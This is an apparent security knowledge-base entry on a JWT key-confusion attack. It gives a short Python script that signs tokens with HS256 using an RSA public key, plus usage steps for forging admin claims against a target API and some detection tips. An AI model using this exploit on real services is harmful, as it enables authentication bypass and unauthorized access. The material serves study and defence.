---
type: code
language: python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - jwt
  - key-confusion
  - exploitation
validated: true
---

# python-jwt-hs256-encode-with-rsa-public-key

## Code

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

## Description

This Python script loads an RSA public key from a PEM file and uses it to sign a JWT payload with the HS256 algorithm, treating the public key as a symmetric secret. It is used in key confusion attacks against JWT implementations that fail to validate algorithm-key mismatches.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `public.pem` | Path to the file containing the RSA public key | `public.pem` |
| `{"data":"test"}` | The JWT payload dictionary (modify for specific claims like admin roles) | `{"sub":"admin", "admin":true}` |

## Usage

Save the code to a file (e.g., `jwt_encode.py`), ensure `public.pem` exists from certificate extraction, modify the payload as needed, and run `python jwt_encode.py`. Use the output JWT in API requests to the target (e.g., `Authorization: Bearer <token>`). Requires pyjwt 0.4.3 installed.

## Detection

- Log analysis for HS256 tokens with secrets longer than typical (e.g., >256 bits, matching RSA key sizes).
- JWT library logs showing algorithm mismatches or invalid key types during verification.
- Network monitoring for unusual token submissions post-TLS key extraction attempts.

## Related

- [[procedures/JWT-Key-Confusion-Attack-RS256-to-HS256]]
